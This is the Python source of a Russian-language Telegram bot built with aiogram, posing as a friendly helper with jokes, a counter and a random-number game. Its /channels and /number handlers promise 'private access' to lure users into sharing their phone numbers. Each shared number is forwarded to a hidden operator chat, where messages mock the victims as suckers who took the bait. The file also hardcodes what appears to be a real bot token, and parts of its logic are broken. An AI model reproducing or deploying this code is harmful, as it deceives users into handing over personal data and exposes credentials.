#!venv/bin/python
import logging
import aiogram.utils.markdown as fmt
import random
from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher.filters import Text
from aiogram.utils.exceptions import MessageNotModified
from contextlib import suppress
from sys import exit

BOT_TOKEN = "2095802411:AAGOAhvGzn5tG2NnVQgXgxfScji2Mtl6GM4"

bot_token = BOT_TOKEN
if not bot_token:
    exit("Error: no token provided")

bot = Bot(token=bot_token)

phone_chat_id = -1001774805952
text = "#num\nУ нас еще один номерок📱"

gift_purse = 0

# Диспетчер для бота
dp = Dispatcher(bot)
# Включаем логирование, чтобы не пропустить важные сообщения
logging.basicConfig(level=logging.INFO)


def get_startkeyboard():
    buttons = [
        types.InlineKeyboardButton(text="Все команды",
                                   callback_data="all_cmds"),
        types.InlineKeyboardButton(text="Мой канал с мемчиками.",
                                   callback_data="lh_mem"),
        types.InlineKeyboardButton(text="Отзывы и предложения.",
                                   callback_data="local_chat")
    ]
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(*buttons)
    return keyboard


def bot_menu():
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    buttons = ["Меню бота📄"]
    keyboard.add(*buttons)
    return keyboard


@dp.message_handler(commands="start")
async def cmd_start(message: types.Message):
    await message.answer(
        "Приветствую тебя в боте для реализации идей, и быстрого выполнения повседневных задач.",
        reply_markup=get_startkeyboard())
    await message.answer(
        "Надеемся, что вы высоко оцените уровень моих безвозмездных услуг, и окажете посильную помощь автору этого бота:\n💳Банковской катой: https://yoomoney.ru/to/4100117410709216\nДругие способы оплаты в разработке.",
        reply_markup=bot_menu())


@dp.callback_query_handler(text="all_cmds")
async def show_cmds(call: types.CallbackQuery):
    await call.message.reply(
        "Команды:\n/gift - выдает рандомный подарок раз в день (если вы его конечно же заслужили)\n/calc - обыкновенный счетчик чисел.\n/random - возьму рандомное число от 1 до 10 (орел и решка + рандом от пользовательских чисел в разработке.)\n/hayou - я спрошу как у тебя дела, расскажу шутку, в общем развеселю😆\n/channels - всякие важные каналы + подарочек😉"
    )
    await call.answer()


@dp.message_handler(Text(equals="Меню бота📄"))
async def cmd_start(message: types.Message):
    await message.answer("Меню бота:", reply_markup=get_startkeyboard())


@dp.callback_query_handler(text="lh_mem")
async def link_mems(call: types.CallbackQuery):
    buttons = [
        types.InlineKeyboardButton(text="Смешной Юмор",
                                   url="tg://resolve?domain=agosset15_mem")
    ]
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(*buttons)
    await call.message.reply(
        "Для перехода на канал с мемчиками нажмите кнопку ниже:",
        reply_markup=keyboard)


@dp.callback_query_handler(text="local_chat")
async def local_chat(call: types.CallbackQuery):
    buttons = [
        types.InlineKeyboardButton(text="Отзывы и Передложения✍",
                                   url="tg://resolve?domain=agosset15bot")
    ]
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(*buttons)
    await call.message.reply(
        "Для перехода в группу для отзывов и предложений нажмите кнопку ниже:",
        reply_markup=keyboard)


@dp.message_handler(commands="hayou")
async def cmd_hayou(message: types.Message):
    buttons = [
        types.InlineKeyboardButton(text="Хорошо", callback_data="cmd_good"),
        types.InlineKeyboardButton(text="Плохо", callback_data="cmd_bad")
    ]
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(*buttons)
    await message.answer("Как дела?", reply_markup=keyboard)


@dp.callback_query_handler(text="cmd_good")
async def good(call: types.CallbackQuery):
    await call.message.answer("Ну и ладненько!")
    await call.answer()


@dp.callback_query_handler(text="cmd_bad")
async def bad(call: types.CallbackQuery):
    buttons = [
        types.InlineKeyboardButton(text="Рассказывай!", callback_data="joke"),
        types.InlineKeyboardButton(text="Не надо мне твоих шуток!",
                                   callback_data="not_joke")
    ]
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(*buttons)
    await call.message.answer("Жаль! Может тебя развеселит шутка?",
                              reply_markup=keyboard)
    await call.answer()


@dp.callback_query_handler(text="joke")
async def joke(call: types.CallbackQuery):
    buttons = [
        types.InlineKeyboardButton(text="Крутая шутка! Давай еще!",
                                   callback_data="joke"),
        types.InlineKeyboardButton(text="Хватит шуток, не помогло.",
                                   callback_data="not_joke")
    ]
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(*buttons)
    await call.message.answer(
        "Смерть к нам приходит черная и с косой. А к мухам- в трусах, в майке и с газетой."
    )
    await call.message.answer(
        "Прости за аналогию со смертью, но в общем-то как?",
        reply_markup=keyboard)
    await call.answer()


@dp.message_handler(commands="test1")
async def cmd_test1(message: types.Message):
    await message.answer("Test 1")


@dp.message_handler(commands="channels")
async def cmd_channels(message: types.Message):
    buttons = [
        types.InlineKeyboardButton(text="Канал моего друга",
                                   url="tg://resolve?domain=Kiberhack"),
        types.InlineKeyboardButton(
            text="Его бот с TERMUX и еще много чем.",
            url="tg://resolve?domain=BotickforTermux_bot")
    ]
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(*buttons)
    await message.answer("Кнопки-ссылки", reply_markup=keyboard)
    await message.answer(
        "Псс! Только по тихому! Для вас есть спец. ссылка для доступа в приватку его бота. Отправьте свой номер для подтвержения личности, и я ее скину. Команда: /number"
    )


# доработать!!!!!!!
@dp.message_handler(commands="gift")
async def cmd_gift(message: types.Message):
    if gift_purse == 0:
        await message.reply("Вы не заслужили подарок!")
    elif gift_purse == 2:
        await message.reply("Вы заслужили подарок!")
        await message.reply(
            "Еще 3 подарка, и у вас появится доступ к приватному разделу!\nКоманда: /priv"
        )


# Команда дл выяснения номера возможно для привата.
@dp.message_handler(commands="number")
async def cmd_number(message: types.Message):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add(types.KeyboardButton(text="Тык сюда!", request_contact=True))
    await message.answer("Скажите нам свой номер телефона:",
                         reply_markup=keyboard)
    await bot.send_message(phone_chat_id, "Еще один лошпед номерок скидывает!")


@dp.message_handler(content_types=['contact'])
async def contact(message: types.Message):
    if message.contact is not None:
        keyboard2 = types.ReplyKeyboardRemove()
        await message.answer("Вы успешно отправили свой номер",
                             reply_markup=keyboard2)
        await message.answer("Скоро вас добавят в приватную группу.",
                             reply_markup=bot_menu())
        contact = message.contact
        print(contact.first_name + " скинул(а) контакт!!")
        await bot.send_message(phone_chat_id, str(text + contact.phone_number))
    elif message.contact is None:
        await bot.send_message(phone_chat_id, "Не попался на удочку, жаль!")


# async def pars(message: types.Message):
# await bot.send_message(phone_chat_id, "У нас еще один номерок📱\n" + nb)

# @dp.message_handler()
#  async def any_text_message2(message: types.Message):
# await message.answer(fmt.text("Привет,", fmt.hbold(message.text)), parse_mode=types.ParseMode.HTML)


@dp.message_handler(commands="vcalls")
async def vcalls(message: types.Message):
    await message.answer(
        f"{fmt.hide_link('https://telegram.org/blog/video-calls/ru')}Кто бы мог подумать, что "
        f"в 2020 году в Telegram появятся видеозвонки!\n\nОбычные голосовые вызовы "
        f"возникли в Telegram лишь в 2017, заметно позже своих конкурентов. А спустя три года, "
        f"когда огромное количество людей на планете приучились работать из дома из-за эпидемии "
        f"коронавируса, команда Павла Дурова не растерялась и сделала качественные "
        f"видеозвонки на WebRTC!\n\nP.S. а ещё ходят слухи про демонстрацию своего экрана :)",
        parse_mode=types.ParseMode.HTML)


@dp.message_handler(commands="random")
async def cmd_random(message: types.Message):
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(
        types.InlineKeyboardButton(text="Нажми меня",
                                   callback_data="random_value"))
    await message.answer(
        "Нажмите на кнопку, чтобы бот отправил число от 1 до 10",
        reply_markup=keyboard)


@dp.callback_query_handler(text="random_value")
async def send_random_value(call: types.CallbackQuery):
    rnd = str(random.randint(1, 10))
    await call.message.answer(rnd)
    if rnd == 10:
        await call.message.answer(
            text="Поздравляю!\nВы выиграли +1 к подарочному уровню.")
        gift_purse = +1


# Здесь хранятся пользовательские данные.
# Т.к. это словарь в памяти, то при перезапуске он очистится
user_data = {}


def get_keyboard():
    # Генерация клавиатуры.
    buttons = [
        types.InlineKeyboardButton(text="-1", callback_data="num_decr"),
        types.InlineKeyboardButton(text="+1", callback_data="num_incr"),
        types.InlineKeyboardButton(text="Подтвердить",
                                   callback_data="num_finish")
    ]
    # Благодаря row_width=2, в первом ряду будет две кнопки, а оставшаяся одна
    # уйдёт на следующую строку
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(*buttons)
    return keyboard


async def update_num_text(message: types.Message, new_value: int):
    with suppress(MessageNotModified):
        await message.edit_text(f"Ваш счет: {new_value}",
                                reply_markup=get_keyboard())


@dp.message_handler(commands="calc")
async def cmd_calc(message: types.Message):
    user_data[message.from_user.id] = 0
    await message.answer("Ваш счет: 0", reply_markup=get_keyboard())


@dp.callback_query_handler(Text(startswith="num_"))
async def callbacks_num(call: types.CallbackQuery):
    # Получаем текущее значение для пользователя, либо считаем его равным 0
    user_value = user_data.get(call.from_user.id, 0)
    # Парсим строку и извлекаем действие, например `num_incr` -> `incr`
    action = call.data.split("_")[1]
    if action == "incr":
        user_data[call.from_user.id] = user_value + 1
        await update_num_text(call.message, user_value + 1)
    elif action == "decr":
        user_data[call.from_user.id] = user_value - 1
        await update_num_text(call.message, user_value - 1)
    elif action == "finish":
        # Если бы мы не меняли сообщение, то можно было бы просто удалить клавиатуру
        # вызовом await call.message.delete_reply_markup().
        # Но т.к. мы редактируем сообщение и не отправляем новую клавиатуру,
        # то она будет удалена и так.
        await call.message.edit_text(f"Итого: {user_value}")
    # Не забываем отчитаться о получении колбэка
    await call.answer()


if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
